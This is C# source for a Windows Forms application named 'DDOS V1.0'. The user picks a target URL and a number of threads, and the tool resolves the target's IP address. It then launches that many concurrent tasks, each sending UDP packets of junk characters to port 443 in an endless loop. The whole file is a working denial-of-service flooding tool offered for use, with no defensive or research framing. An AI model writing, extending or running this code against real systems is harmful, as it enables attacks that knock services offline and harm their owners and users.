using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Net.Http;

namespace DDOS_V1._0
{
    public partial class mainDDOS : Form
    {
        public mainDDOS()
        {
            InitializeComponent();
        }




        private void X_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private async void attackButton_Click(object sender, EventArgs e)
        {

            Program.trgt = targetBox.Text;

            var result = await CallAttack();
            
        }

        public Task<string> CallAttack()
        {
            string status = "";
            try
            {
                var threadCount = Convert.ToInt32(limitBox.Text);
                //var threadArray = new Thread[threadCount];  //thread
                var taskArray = new Task[threadCount];
                for (int i = 0; i < threadCount; i++)
                {
                    //threadArray[i] = new Thread( async ()=> await Attack());
                    taskArray[i] = Task.Factory.StartNew(async () => await Attack());
                }

                infoBox.Text = "";
                int count = 0;
                foreach (var thread in taskArray) //
                {
                    count++;
                    //thread.IsBackground = true;
                    //thread.Start();
                    Thread.Sleep(3);
                    infoBox.AppendText($"thread{count} Started Working..");
                    infoBox.AppendText(Environment.NewLine);
                }

                Task.WaitAll(taskArray);
                status = "success";
                return Task.Run(() => string.Empty);
            }
            catch (Exception ex)
            {
                var error = ex.Message;
                MessageBox.Show(ex.Message);
            }

            return Task.Run(() => string.Empty);
        }

        public async Task Attack()
        {
            ///Thread and things for DDOS v1.0
            //var trgt = target;

            var trgt = targetBox.Text;

            TcpClient tcpClient = new TcpClient();

            try
            {
                var ip = await GetIPAddress($"{trgt}");
                //infoBox.Text = $"Target Ip Address {ip}";

                UdpClient client = new UdpClient();
                var sendBytes = GetBytesFromString();

                while (true)
                {
                    client.Connect(ip, 443);
                    await client.SendAsync(sendBytes, sendBytes.Length);
                    client.AllowNatTraversal(true);
                    client.DontFragment = true;

                    Thread.Sleep(5);
                }
            }
            catch (Exception ex)
            {

                MessageBox.Show(ex.Message);
            }

            //infoBox.Text = $"Target = {target}, target Ip = {ip}, requests = {limit}, limit = {limit}";
            //infoBox.Text = $"Target = {target}, target Ip = {ip}";

        }

        public async static Task<IPAddress> GetIPAddress(string target)
        {
            var url = $"{target}";
            Uri myUri = new Uri(url);
            var ipArr = await Dns.GetHostAddressesAsync(myUri.Host);
            var ip = ipArr[0];

            return ip;
        }

        const string chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz#@$^*()";
        private static byte[] GetBytesFromString()
        {
            string data = "";
            for (int i = 0; i < 3; i++)
            {
                data = data + chars;
            }

            byte[] sendBytes = Encoding.ASCII.GetBytes(data);
            return sendBytes;
        }




        private void stopButton_Click(object sender, EventArgs e)
        {
            try
            {
                Stop();
            }
            catch (Exception ex)
            {

                MessageBox.Show(ex.Message);
            }
        }

        private void Stop()
        {
            /// stop attack
            Application.Exit();
        }




        



    }
}

